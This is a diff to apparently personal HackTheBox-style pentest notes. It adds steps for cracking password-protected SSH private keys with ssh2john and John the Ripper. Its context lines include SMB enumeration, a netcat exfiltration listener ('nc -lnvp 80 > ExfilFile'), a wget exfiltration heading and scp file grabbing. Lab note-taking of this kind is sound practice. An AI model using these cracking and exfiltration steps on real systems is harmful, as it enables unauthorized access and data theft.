@@ -16,6 +16,8 @@ To crack an SSH key with John
   - python sshng2john.py id_rsa > ssh_login
   - john ssh_login --wordlist=/usr/share/wordlists/rockyou.txt
     - Then, ssh with the key and the obtained password: ssh -i id_rsa orestis@10.10.10.17
+    
+Generate an SSH key: ssh-keygen -f postman  
 
 Enumerating SMB: https://infinitelogins.com/2020/06/17/enumerating-smb-for-pentesting/#:~:text=protocol%20negotiation%20failed%3A%20NT_STATUS_CONNECTION_DISCONNECTED%20This%20error%20occurs%20because,to%20use%20the%20weaker%20and%20more%20insecure%20protocols.
 	- smbmap -H <IP Address>
@@ -98,7 +100,7 @@ https://github.com/SammyBasri/HackTheBox/blob/main/notes.txt
 To find files/folders owned by a user
   - find / -user user 2> /dev/null
   
-To switch to a different user while in a Linux shell: su - <username>  
+To switch to a different user while in a Linux shell: su - <username>  or su <usrename>
 
 Using Netcat to exfil files 
   - On attacker machine: nc -lnvp 80 > ExfilFile
@@ -133,7 +135,10 @@ Wget Exfil:
   
 Use scp to download files via ssh
      - sudo scp root@192.168.100.22:/etc/file .
-    
+     
+Password Protected SSH Private Key: 
+	- python ssh2john.py key > out.txt 
+	- sudo john --wordlist=rockyou.txt out.txt
   
  
  Windows: 
